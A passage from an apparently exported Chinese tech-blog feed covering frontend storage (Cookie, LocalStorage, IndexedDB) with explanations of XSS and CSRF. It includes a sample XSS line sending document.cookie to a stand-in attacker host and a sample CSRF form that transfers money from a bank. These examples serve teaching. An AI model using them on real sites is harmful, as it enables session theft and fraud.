punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-数字分隔符"><a href="#5-数字分隔符" class="headerlink" title="5. 数字分隔符"></a>5. 数字分隔符</h3><blockquote><p>数字分隔符，可以在数字之间创建可视化分隔符，通过_下划线来分割数字，使数字更具可读性</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> money <span class="token operator">=</span> 1_000_000_000<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//等价于</span><span class="token keyword">const</span> money <span class="token operator">=</span> <span class="token number">1000000000</span><span class="token punctuation">;</span>1_000_000_000 <span class="token operator">===</span> <span class="token number">1000000000</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpw3xt7sygj30ic02c0sl.jpg" alt="img">  </p>]]></content>
      
      
      <categories>
          
          <category> ECMAScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> es </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入浅出前端缓存</title>
      <link href="2021/04/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%8D%E7%AB%AF%E7%BC%93%E5%AD%98/"/>
      <url>2021/04/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%8D%E7%AB%AF%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>2021 年，如果你的前端应用，需要在浏览器上保存数据，有三个主流方案：</p><ul><li>Cookie</li><li>Web Storage (LocalStorage)</li><li>IndexedDB</li></ul><p>这些方案就是如今应用最广、浏览器兼容性最高的三种前端储存方案</p><p>今天这篇文章就聊一聊这三种方案的历史，优缺点，以及各自在今天的适用场景</p><p>文章在后面还会提出一个全新的，基于 IndexedDB 的，更适合现代前端应用的前端本地储存方案 <code>GoDB.js</code></p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="Cookie-的历史"><a href="#Cookie-的历史" class="headerlink" title="Cookie 的历史"></a>Cookie 的历史</h3><p>Cookie 早在1994 年就被发明了出来，它的历史甚至和互联网本身的历史一样悠久</p><p>和其它两种本地储存方案不一样的是，Cookie 本身并不是为了解决「在浏览器上存东西」而被发明，它的出现是为了解决 HTTP 协议无状态特性的问题</p><p>什么是 HTTP 协议的无状态特性？简单来说就是：用户的两次 HTTP 请求，服务端并不能通过请求本身，知道这两次请求，来自于同一个用户</p><p>比如我们如今司空见惯的登录功能，在 Cookie 被发明之前其实几乎无法实现登录态的长久保持</p><p>也就是说，Cookie 其实是作为「HTTP 协议的补充」被发明出来的，因此，在英文语境中，大多时候其实都用 <code>HTTP cookie</code> 来指 Cookie</p><p>Cookie 最初被其发明者 Lou Montulli 用在电商网站上，用来记录购物车里的商品，这样当用户想要结账时，浏览器会把 Cookie 里的商品数据以及用户信息发送给服务器，服务器就能知道用户想要购买哪些商品</p><p>Cookie 在很长一段时间内，都是浏览器储存数据的唯一解决方案，直到今天，Cookie 在很多领域仍然有大量的使用</p><h3 id="Cookie-的今天"><a href="#Cookie-的今天" class="headerlink" title="Cookie 的今天"></a>Cookie 的今天</h3><p>2021 年，虽然 Cookie 在部分领域仍有不可替代的价值，但其已经不再适合被做为一个前端本地储存方案去使用：</p><ul><li><p>Cookie 的安全问题</p></li><li><ul><li>Cookie 在每次请求中都会被发送，如果不使用 HTTPS 并对其加密，其保存的信息很容易被窃取，导致安全风险</li><li>举个例子，在一些使用 Cookie 保持登录态的网站上，如果 Cookie 被窃取，他人很容易利用你的 Cookie 来假扮成你登录网站</li><li>当然可以用 Session 配合 Cookie 来缓解这个问题，但是 Session 会占用额外的服务器资源</li><li>Cookie 每次请求自动发送的特性还会导致 CSRF 攻击的安全风险</li></ul></li><li><p>Cookie 只允许储存 4kb 的数据</p></li><li><p>Cookie 的操作较为繁琐复杂（这一点倒是可以通过使用类库来解决）</p></li></ul><p>有人说由于浏览器每次请求都会带上 Cookie，因此 Cookie 还有个缺点是会增加带宽占用，但其实放在今天的网络环境来看，这点占用基本可以忽略不计</p><p>总之，如今已经不推荐使用 Cookie 来在浏览器上保存数据，大部分曾经应用 Cookie 的场景，在今天都可以用 LocalStorage 实现更优雅更安全的替代</p><p><strong>但是</strong>，即使 Cookie 已经不适合用来在浏览器上储存数据，其在某些特定领域，在今天仍然独特的价值</p><p>最常见的就是用在广告中，用来跨站标记用户与跟踪用户行为，这样在你访问不同页面时，广告商也能知道是同一个用户在访问，从而实现后续的商品推荐等功能</p><p>假设 <code>abc.com</code> 和 <code>xyz.com</code> 都内嵌了淘宝的广告，你会发现即使 <code>abc.com</code> 和 <code>xyz.com</code> 所有者不一致，两个网站上淘宝广告推荐的商品也出奇的一致，这背后是因为淘宝知道是同一个人，分别在 <code>abc.com</code> 和 <code>xyz.com</code> 访问淘宝的广告</p><p>这是如何实现的呢？答案是第三方 Cookie</p><h3 id="第三方-Cookie"><a href="#第三方-Cookie" class="headerlink" title="第三方 Cookie"></a>第三方 Cookie</h3><p>之所以有第三方 Cookie 这个称呼，是因为 Cookie 执行同源策略，<code>a.com</code> 和 <code>b.com</code> 各自只能访问自己的 Cookie，无法访问对方或者任何不属于自己的 Cookie</p><p>如果在访问 <code>a.com</code> 时，设置了一个 <code>b.com</code> 的 Cookie（比如内嵌 <code>b.com</code> 的页面），那么这个 Cookie 相对于 <code>a.com</code> 而言就是第三方 Cookie</p><p>值得一提的是，是同一个 host 下的不同端口倒是可以互相访问 Cookie</p><p>这里提一下对第三方 Cookie 而言非常重要的一个特性：<strong>Cookie 可以被服务端设置</strong></p><p>服务器可以通过 response 的请求头来要求浏览器设置 Cookie</p><pre class="line-numbers language-js"><code class="language-js">Set<span class="token operator">-</span>Cookie<span class="token punctuation">:</span> userId<span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>浏览器在检测到返回请求的 header 里有 Set-Cookie 请求头后，就会自动设置 Cookie，不需要开发者用 JS 去做额外的操作</p><p>这样带来的好处是，当 <code>abc.com</code> 和 <code>xyz.com</code> 想在自己的网页上内嵌淘宝广告时，只需要把淘宝提供的组件放进 HTML 即可，不需要写额外的 JS，也能让淘宝进行跨站定位用户</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"taobao.com/some-ads"</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（这个组件纯属虚构，仅为方便理解）</p><p>它是如何工作的呢？</p><ol><li>当用户处于 <code>abc.com</code> 时，浏览器会向 <code>taobao.com/some-ads</code> 发起一个 HTTP 请求</li><li>当淘宝服务器返回广告内容时，会顺带一个 <code>Set-Cookie</code> 的 HTTP 请求头，告诉浏览器设置一个源为 <code>taobao.com</code> 的 Cookie，里面存上当前用户的 ID 等信息</li><li>这个 Cookie 相对于 <code>abc.com</code> 而言就是第三方 Cookie，因为它属于 <code>taobao.com</code></li><li>而当用户访问 <code>xyz.com</code> 时，由于 <code>xyz.com</code> 上也嵌入了淘宝的广告，因此用户的浏览器也会向 <code>taobao.com/some-ads</code> 发起请求</li><li>有意思的来了，发请求时，浏览器发现本地已有 <code>taobao.com</code> 的 Cookie（此前访问 <code>abc.com</code> 时设置的），因此，浏览器会将这个 Cookie 发送过去</li><li>淘宝服务器根据发过来的 Cookie，发现当前访问 <code>xyz.com</code> 的用户和之前访问 <code>abc.com</code>的用户是同一个，因此会返回相同的广告</li></ol><p>广告商用第三方 Cookie 来跨站定位用户大概就是这么个过程，实际肯定要复杂许多，但基本原理是一致的</p><p>总之，关键就是利用了 Cookie 的两个特点</p><ul><li>Cookie 可以被服务器设置</li><li>浏览器每次请求会自动带上 Cookie</li></ul><p>正因为这两个特点，即使 Cookie 在今天看来缺点一大堆，但仍然在部分领域有不可替代的价值</p><p>但也是因为这两个特点，导致 Cookie 的安全性相对不高，总之 Cookie 的这个设计放在今天来看，就是一把双刃剑</p><h3 id="Cookie-配置"><a href="#Cookie-配置" class="headerlink" title="Cookie 配置"></a>Cookie 配置</h3><p>服务端要求浏览器建立 Cookie 时，可以在请求头里放一些配置声明，修改 Cookie 的使用特性</p><h4 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h4><p>在前段时间，Chrome 更新 80 版本时，将 Cookie 的跨站策略（SameSite）默认设置为了 <code>Lax</code>，即仅允许同站或者子站访问 Cookie，而老版本是 <code>None</code>，即允许所有跨站 Cookie</p><p>这会导致用户访问 <code>xyz.com</code> 时，浏览器默认将不会发送 Cookie 给 <code>taobao.com</code>，导致第三方 Cookie 失效的问题</p><p>要解决的话，在返回请求的 header 里将 SameSite 设置为 <code>None</code> 即可</p><pre><code>Set-Cookie: userId=123; SameSite=None</code></pre><h4 id="Secure-HttpOnly"><a href="#Secure-HttpOnly" class="headerlink" title="Secure, HttpOnly"></a>Secure, HttpOnly</h4><p>Cookie 还有两个常用属性 <code>Secure</code> 和 <code>HttpOnly</code></p><pre><code>Set-Cookie: userId=123; SameSite=None; Secure; HttpOnly</code></pre><p>其中 <code>Secure</code> 是只允许 Cookie 在 HTTPS 请求中被使用</p><p>而 <code>HttpOnly</code> 则用来禁止使用 JS 访问 cookie</p><pre><code>ducoment.cookie // 访问被禁止了</code></pre><p>这样最大的好处是避免了 XSS 攻击</p><h4 id="XSS-攻击"><a href="#XSS-攻击" class="headerlink" title="XSS 攻击"></a>XSS 攻击</h4><p>比如你在水一个论坛，这个论坛有个 bug：不会对发布内容中的 HTML 标签进行过滤</p><p>某一天，一个恶意用户发了个帖子，内容如下：</p><pre><code>&lt;script&gt;window.open(&quot;atacker.com?cookie=&quot; + document.cookie&lt;/script&gt; </code></pre><p>当你访问这条帖子的内容时，浏览器就会执行 <code>&lt;script&gt;</code> 中的代码，导致你的 Cookie 被发送给攻击者，接着攻击者就可以利用你的 Cookie 登录论坛，然后为所欲为了</p><p>XSS 攻击在很多情况下，用户甚至不会知道自己被攻击了，比如利用 <code>&lt;img/&gt;</code> 的 <code>src</code> 属性，就可以做到悄无声息的把用户的信息发给攻击者</p><p>而当设置了 <code>HttpOnly</code> 后，<code>ducoment.cookie</code> 将获取不到 Cookie，攻击者的代码自然就无法生效了</p><p><strong>Cookie 总结</strong></p><p>总而言之，Cookie 在今天的适用场景其实比较有限，当你需要在本地储存数据时，由于安全性和储存空间的问题，一般不推荐使用 Cookie，大部分情况下使用 Web Storage 是个更好的选择</p><h2 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h2><p>在 2014 年年底发布的 HTML5 标准中，新增了一个 Web Storage 的本地储存方案，其包括</p><ul><li>LocalStorage</li><li>SessionStorage</li></ul><p>SessionStorage 和 LocalStorage 使用方法基本一致，唯一不同的是，一旦关闭页面，SessionStorage 将会删除数据；因此这里主要以 LocalStorage 为例</p><p>LocalStorage 的特点是：</p><ul><li>使用 Key-Value 形式储存</li><li>使用很方便</li><li>大小有 10MB</li><li>Key 和 Value 以字符串形式储存</li></ul><p>LocalStorage 的使用非常简单，比如要在本地保存 <code>userId</code>：</p><pre class="line-numbers language-js"><code class="language-js">localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'userId'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'userId'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>只要用 <code>setItem</code> 保存过一次，哪怕用户关闭了页面，再次打开页面时都可以用 <code>getItem</code> 获取到想要的数据</p><p>LocalStorage 一出现，就在许多应用场景彻底替代了 Cookie，大部分需要在浏览器上存数据的场景，都会优先使用 LocalStorage</p><p>它和 Cookie 的主要区别是：</p><ul><li>储存空间更大，使用更方便</li><li>Cookie 可以被服务器设置，而 LocalStorage 只能前端手动操作</li><li>Cookie 的数据会由浏览器自动发给服务器，LocalStorage 需要手动取出来放到请求里面才会发给服务器，因此可以避免 CSRF 攻击</li></ul><h3 id="CSRF-攻击"><a href="#CSRF-攻击" class="headerlink" title="CSRF 攻击"></a>CSRF 攻击</h3><p>假设你在浏览器中登录过某个银行 <code>bank.com</code>，这个银行系统使用 Cookie 来保存你的登录态</p><p>接着你访问了一个恶意网站，该网站中有一个表单：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bank.com/transfer<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>amount<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100000.00<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>target<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>attacker<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>屠龙宝刀，点击就送!<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（假设 <code>bank.com/transfer</code> 是用来转账的接口）</p><p>当你被诱导点下了提交按钮后：</p><ol><li>由于 form 表单提交是可以跨域的，你将会对 <code>bank.com/transfer</code> 发起一次 POST 请求</li><li>由于此前你已经登录过 <code>bank.com</code>，浏览器会自动将你的 Cookie 一并发送过去（即使你当前并未处于银行系统的页面）</li><li><code>bank.com</code> 收到你的带 Cookie 的请求后，认为你是正常登录了的，导致转账成功进行</li><li>最终你损失了一大笔钱</li></ol><p>注意即使用 Cookie 配合 HTTPS 请求，CSRF 攻击也无法被避免，因为 HTTPS 请求只是对传输的数据进行了加密，而 CSRF 攻击的特点是，诱导你去访问某个需要你的权限的接口，HTTPS 并不能阻止这种访问</p><p>这里的 CSRF 攻击的核心，就是利用了浏览器会自动在所有请求里带上 Cookie 的特性</p><p>因此，LocalStorage 比较常见的一个替代 Cookie 的场景就是登录态的保持，比如用 token 的方法加上 HTTPS 请求，就可以很大程度上提高登录的安全性，避免被 CSRF 攻击（但是依然无法完全避免被 XSS 攻击的风险）</p><p>大概工作流程就是，用户登录后，从服务器拿到一个 token，然后存进 LocalStorage 里，之后每次请求前都从 LocalStorage 里取出 token，放到请求数据里，服务器就能知道是同一个用户在发起请求了；由于 HTTPS 的存在，也不用担心 token 会被泄露给第三方，因此是很安全的</p><p>总结为什么 LocalStorage 在大部分应用场景替代了 Cookie：</p><ul><li>LocalStorage 更好用，更简单，储存空间更多</li><li>LocalStorage 免去了 Cookie 遭受 CSRF 攻击的风险</li></ul><h3 id="LocalStorage-的缺点"><a href="#LocalStorage-的缺点" class="headerlink" title="LocalStorage 的缺点"></a>LocalStorage 的缺点</h3><p>但是，LocalStorage 也不是完美的，它有两个缺点：</p><ul><li>无法像 Cookie 一样设置过期时间</li><li>只能存入字符串，无法直接存对象</li></ul><p>举个例子，假如你想存一个对象或者非 string 的类型到 LocalStorage：</p><pre class="line-numbers language-js"><code class="language-js">localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">'value'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// '[object, Object]'</span>localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// '1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你会发现，存进去的如果是对象，拿出来就变成了字符串 <code>&#39;[object, object]&#39;</code>，数据丢失了！</p><p>存进去的如果是 number，拿出来也变成了 string</p><p>要解决这个问题，一般是使用 <code>JSON.stringify()</code> 配合 <code>JSON.parse()</code></p><pre><code>localStorage.setItem(&#39;key&#39;, JSON.stringify({name: &#39;value&#39;}));console.log(JSON.parse(localStorage.getItem(&#39;key&#39;))); // {name: &#39;value&#39;}</code></pre><p>这样，就可以实现对象和非 string 类型的储存了</p><p><strong>但是</strong>，这么做有一个缺点，那就是 <code>JSON.stringify()</code> 本身是存在一些问题的</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> a <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    a<span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>    b<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    c<span class="token punctuation">:</span> <span class="token regex">/abc/</span><span class="token punctuation">,</span>    d<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "{"c":{},"d":"2021-02-02T19:40:12.346Z"}"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// {c: {}, d: "2021-02-02T19:40:12.346Z"}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上，<code>JSON.stringify()</code> 无法正确转换 JS 的部分属性</p><ul><li>undefiend</li><li>Function</li><li>RegExp（正则表达式，转换后变成了空对象）</li><li>Date（转换后变成了字符串，而非 Date 类的对象）</li></ul><p>其实还有个 Symbol 也无法被转换，但由于 Symbol 本身定义（全局唯一性）就决定了，它不应该被转换，否则即使转换回来，也不会是原来那个 Symbol</p><p>Function 也比较特殊，不过要兼容的话，可以先调用 <code>.toString()</code> 转换为字符串储存，需要的时候再 <code>eval</code> 转回来</p><p>以及，<code>JSON.stringify()</code> 无法转换循环引用的对象</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token punctuation">{</span> key<span class="token punctuation">:</span> <span class="token string">'value'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Uncaught TypeError: Converting circular structure to JSON</span><span class="token comment" spellcheck="true">//     --> starting at object with constructor 'Object'</span><span class="token comment" spellcheck="true">//     --- property 'a' closes the circle</span><span class="token comment" spellcheck="true">//     at JSON.stringify (&lt;anonymous>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大部分应用中，<code>JSON.stringify()</code> 的这个问题基本上可以忽略，但是一小部分场景还是会导致问题，比如想保存一个正则表达式，一个 Date 对象，这种方法就会出问题</p><p><strong>总结</strong></p><p>在大部分应用场景下，LocalStorage 已经能完全替代 Cookie，只有类似于广告这种场景，由于 Cookie 可以被服务端设置，Cookie 仍存在不可替代的价值</p><p>但是 LocalStorage 并不完美，它只支持 10MB 储存，在一些应用场景还是不够用，并且原生只支持字符串，<code>JSON.stringify()</code> 的解决方案又不够完美，因此很多时候不太适合大量数据和复杂数据的储存</p><h2 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h2><p>IndexedDB 的全称是 Indexed Database，从名字中就可以看出，它是一个数据库</p><p>IndexedDB 早在 2009 年就有了第一次提案，但其实它和 Web Storage 几乎是同一时间普及到各大浏览器的（没错，就是 2015 年那会，es6 也是那时候）</p><p>IndexedDB 是一个正经的数据库，它在问世后替代了原来不正经的 Web SQL 方案，成为了当今唯一运行在浏览器里的数据库</p><p>在我看来，IndexedDB 其实更适合当作终极前端本地数据储存方案</p><p>相比于 LocalStorage，IndexedDB 的<strong>优点</strong>是</p><ul><li><p>储存量理论上没有上限</p></li><li><ul><li>Chrome 对 IndexedDB 储存空间限制的定义是：硬盘可用空间的三分之一</li></ul></li><li><p>所有操作都是异步的，相比 LocalStorage 同步操作性能更高，尤其是数据量较大时</p></li><li><p>原生支持储存 JS 的对象</p></li><li><p>是个正经的数据库，意味着数据库能干的事它都能干</p></li></ul><p>但是缺点也比较致命：</p><ul><li>操作非常繁琐</li><li>本身有一定门槛（需要你懂数据库的概念）</li></ul><p>由于提案较早，IndexedDB 的 API 设计其实是比较糟糕的，对于新手而言，光是想连上数据库，并往里面加东西，都需要折腾半天</p><p>对于简单的数据储存而言，IndexedDB 的 API 显得太复杂了，再加上其 API 全是异步的，会带来额外的心智负担，远没有 LocalStorage 简单两行代码搞定数据存取来的快</p><p>因此，IndexedDB 在今天的使用规模相比 LocalStorage 差远了，即使 IndexedDB 本身的设计其实更适合用来在浏览器上储存数据</p><p>总之，如果不考虑 IndexedDB 的操作难度，其作为一个前端本地储存方案其实是接近完美的</p><h3 id="简单理解数据库"><a href="#简单理解数据库" class="headerlink" title="简单理解数据库"></a>简单理解数据库</h3><p>在使用 IndexedDB 前，你首先需要懂基本的数据库概念</p><p>这里用 Excel 类比，简单介绍数据库的基本概念，不做太深入的讨论</p><p>需要了解四个基本概念，以关系型数据库为例</p><ul><li>数据库 Database</li><li>数据表 Table（IndexedDB 中叫 ObjectStore）</li><li>字段 Field</li><li>事务 Transaction</li></ul><p>（虽然 IndexedDB 算不上关系型数据库，但概念都是相通的）</p><p>假设清华和北大各自需要建一个数据库，用来存各自学生与教工的信息，假设命名为</p><ul><li>清华：<code>thu</code></li><li>北大：<code>pku</code></li></ul><p>这样，清北之间的数据就可以相互独立</p><p>然后，我们再到数据库里建表</p><ul><li><code>student</code> 表，储存学生信息</li><li><code>stuff</code> 表，储存教工信息</li></ul><p>数据表（Table）是什么？说白了，就是一个类似于 Excel 表一样的东西</p><p>比如 <code>student</code> 表，可以长这样：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth1f4rbtj30gr02uweb.jpg" alt="图片">  </p><p>上面的 学号、姓名、年龄、专业 就是数据表的字段</p><p>当我们想往 <code>student</code> 表添加数据时，就需要按照规定的格式，往表里加数据（关系型数据库的特点，而 IndexedDB 允许不遵守格式）</p><p>数据库也给我们提供了方法，当我们知道一个学生的学号（id），就可以在非常短的时间内，在表里成千上万个学生中，快速找到这个学生，并返回他的完整信息</p><p>也可以根据 id 定位，对该学生的数据进行修改，或者删除</p><p>id 这种每条数据唯一的值，就可以被用来做主键（primary key），主键在表内独一无二，无法添加相同主键的数据</p><p>而主键一般会被建立索引，所谓对字段建立索引，就是可以根据这个字段的值，在表里非常快速的找到对应的数据（通常不高于 O(logN)），如果没有索引，那可能就需要遍历整个表（O(N)）</p><p>增、删、改、查这些操作，都需要通过事务 Transaction 来完成</p><ul><li>如果事务中任何一个操作没有成功，整个事务都会回滚</li><li>在事务完成之前，操作不会影响数据库</li><li>不同事务之间不能互相影响</li></ul><p>举个例子，当你发起一个事务，想利用这个事务添加两个学生，如果第一个学生添加成功，但是第二个学生添加失败，事务就会回滚，第一个学生将根本不会在数据库中出现过</p><p>事务在银行转账这种场景非常有用：如果转账中任何一步失败了，整个转账操作就和没发生过一样，不会造成任何影响</p><p>在同一个 Excel 文件（数据库）中，我们除了 <code>student</code> 表，还可以有 <code>stuff</code> 表（同一个数据库中有了两个不同的数据表）：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth1pvekmj30gr05c0sm.jpg" alt="图片">  </p><p>然后，清华和北大各自分一个 Excel 文件，就相当于分了两个数据库</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth20n6urj306h0390si.jpg" alt="图片">  </p><p>总而言之，不扯数据库各种难理解的概念，我们其实完全可以用 Excel 来类比数据库</p><ul><li>一个 Excel 文件就是一个 Database</li><li>一个 Excel（Database）里可以有很多不同表格（数据表 Table）</li><li>表格的列的名称其实就是字段</li></ul><p>上述类比最接近 MySQL 这种关系型数据库，但放在其它一些比较特殊的数据库上可能就不太妥当（比如图数据库）</p><p>如果你是新手，用 Excel 类比理解数据库完全没问题，足以使用 IndexedDB 了</p><p>虽然说 IndexedDB 使用 key-value 的模式储存数据，但你也完全可以用数据表 Table 的模式来看待它</p><h3 id="IndexedDB-的使用"><a href="#IndexedDB-的使用" class="headerlink" title="IndexedDB 的使用"></a>IndexedDB 的使用</h3><p>使用 IndexedDB 的第一步是打开数据库：</p><pre><code>const request = window.indexedDB.open(&#39;pku&#39;);</code></pre><p>上面这个操作打开了名为 <code>pku</code> 的数据库，如果不存在，浏览器会自动创建</p><p>然后 <code>request</code> 上有三个事件：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> db<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 全局 IndexedDB 数据库实例</span>request<span class="token punctuation">.</span>onupgradeneeded <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'version change'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>request<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  db <span class="token operator">=</span> request<span class="token punctuation">.</span>result<span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'db connected'</span><span class="token punctuation">)</span>l<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>request<span class="token punctuation">.</span>onblocked <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'db request blocked!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>request<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'error!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>IndexedDB 